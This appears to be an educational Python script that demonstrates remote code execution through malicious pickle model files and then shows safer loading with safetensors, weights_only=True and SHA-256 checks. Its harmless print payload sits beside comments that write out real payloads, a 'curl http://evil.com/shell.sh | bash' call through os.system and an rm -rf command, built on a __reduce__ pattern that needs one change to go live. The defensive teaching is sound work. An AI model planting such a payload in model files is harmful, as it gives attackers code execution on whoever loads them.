"""
Supply Chain Attack — Malicious Pickle Deserialization Demo
===========================================================
Demonstrates how PyTorch/pickle model files can execute arbitrary code
on loading (Remote Code Execution via deserialization).

This is the most critical AI supply chain vulnerability:
ANY .pkl, .pt, or .pth file from an untrusted source is a potential RCE vector.

IMPORTANT: This demo shows a SAFE simulation — the payload prints a warning
message instead of executing any harmful command.

Educational use only.
"""

import pickle
import io
import os
import hashlib


# ---------------------------------------------------------------------------
# Safe simulation of malicious pickle
# (Prints a warning instead of executing real harm)
# ---------------------------------------------------------------------------

class SafeSimulatedPayload:
    """
    Simulates what a malicious pickle payload would do.
    In real attacks, __reduce__ returns (os.system, ("curl evil.com | bash",))
    This version just prints a warning to demonstrate the concept.
    """
    def __reduce__(self):
        # SAFE: just print a message
        # DANGEROUS in real attack: return (os.system, ("curl http://evil.com/shell.sh | bash",))
        # DANGEROUS in real attack: return (subprocess.Popen, (["rm", "-rf", "/tmp/test"],))
        return (
            print,
            ("[SECURITY DEMO] Malicious pickle payload executed! "
             "In a real attack, this would run: curl http://attacker.com/shell.sh | bash",)
        )


class FakeModelWeights:
    """
    Simulates model weights that look legitimate but embed a payload.
    An attacker would hide this inside what appears to be a real model checkpoint.
    """
    def __init__(self):
        self.layer1_weights = [[0.1, 0.2, 0.3], [0.4, 0.5, 0.6]]
        self.layer2_weights = [[0.7, 0.8], [0.9, 1.0]]
        self._internal = SafeSimulatedPayload()  # Hidden payload

    def __getstate__(self):
        return {
            "layer1": self.layer1_weights,
            "layer2": self.layer2_weights,
            "_internal": self._internal,
        }

    def __setstate__(self, state):
        self.layer1_weights = state["layer1"]
        self.layer2_weights = state["layer2"]
        self._internal = state["_internal"]


# ---------------------------------------------------------------------------
# Demonstrate the attack
# ---------------------------------------------------------------------------

def demonstrate_malicious_pickle():
    print("Malicious Pickle Demo")
    print("=" * 60)

    # Attacker creates a "model file"
    fake_model = FakeModelWeights()

    # Serialise to bytes (simulates uploading to HuggingFace Hub)
    buffer = io.BytesIO()
    pickle.dump(fake_model, buffer)
    malicious_bytes = buffer.getvalue()

    print(f"\n[Attacker] Created 'model file' ({len(malicious_bytes)} bytes)")
    print("  Looks like legitimate model weights: layer1, layer2")

    # Victim loads the "model"
    print("\n[Victim] Loading model from untrusted source...")
    print("  import pickle")
    print("  model = pickle.load(open('model.pkl', 'rb'))  # <- RCE occurs here!")
    print()

    # This triggers the payload
    loaded = pickle.loads(malicious_bytes)
    print("\n[Result] Model 'loaded' but code was executed during deserialization!")


# ---------------------------------------------------------------------------
# Safe loading alternatives
# ---------------------------------------------------------------------------

def safe_model_loading_comparison():
    print("\n" + "=" * 60)
    print("Safe vs Unsafe Model Loading")
    print("=" * 60)

    print("""
UNSAFE (vulnerable to RCE):
    import torch
    model = torch.load("untrusted_model.pt")        # Uses pickle
    model = pickle.load(open("model.pkl", "rb"))    # Direct pickle

SAFER (use safetensors format):
    from safetensors.torch import load_file
    model_weights = load_file("trusted_model.safetensors")
    # safetensors only stores tensor data — no executable code

SAFER (use weights_only=True in PyTorch 1.13+):
    import torch
    model = torch.load("model.pt", weights_only=True)
    # Restricts deserialization to tensor types only

SAFEST (verify checksum before loading):
    import hashlib, torch
    
    TRUSTED_HASH = "abc123..."  # Published by model author
    
    with open("model.pt", "rb") as f:
        data = f.read()
    
    actual_hash = hashlib.sha256(data).hexdigest()
    if actual_hash != TRUSTED_HASH:
        raise SecurityError("Model file has been tampered with!")
    
    # Only load after verification
    model = torch.load(io.BytesIO(data), weights_only=True)
""")


# ---------------------------------------------------------------------------
# Checksum verification example
# ---------------------------------------------------------------------------

def verify_file_checksum(file_bytes: bytes, expected_sha256: str) -> bool:
    """Verify a file's SHA-256 checksum before loading."""
    actual = hashlib.sha256(file_bytes).hexdigest()
    return actual == expected_sha256


def demonstrate_checksum_verification():
    print("=" * 60)
    print("Checksum Verification Demo")
    print("=" * 60)

    # Legitimate model bytes
    legitimate_bytes = b"tensor_weights_data_here_v1.0_legitimate"
    legitimate_hash  = hashlib.sha256(legitimate_bytes).hexdigest()
    print(f"\n[Legitimate model SHA-256]: {legitimate_hash}")

    # Tampered model bytes (attacker modified the file)
    tampered_bytes = b"tensor_weights_data_here_v1.0_TAMPERED_malicious_code"
    tampered_hash  = hashlib.sha256(tampered_bytes).hexdigest()
    print(f"[Tampered model SHA-256]:   {tampered_hash}")

    print(f"\nVerifying legitimate model... ", end="")
    if verify_file_checksum(legitimate_bytes, legitimate_hash):
        print("✓ PASS — safe to load")

    print(f"Verifying tampered model...  ", end="")
    if not verify_file_checksum(tampered_bytes, legitimate_hash):
        print("✗ FAIL — checksum mismatch! Refusing to load.")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    demonstrate_malicious_pickle()
    safe_model_loading_comparison()
    demonstrate_checksum_verification()

    print("\n[Key Takeaways]")
    print("1. NEVER load pickle files from untrusted sources without sandboxing.")
    print("2. Use safetensors format for model weights when possible.")
    print("3. Use torch.load(..., weights_only=True) for PyTorch checkpoints.")
    print("4. Always verify SHA-256 checksums against published values.")
    print("5. Run picklescan on any downloaded model before loading.")
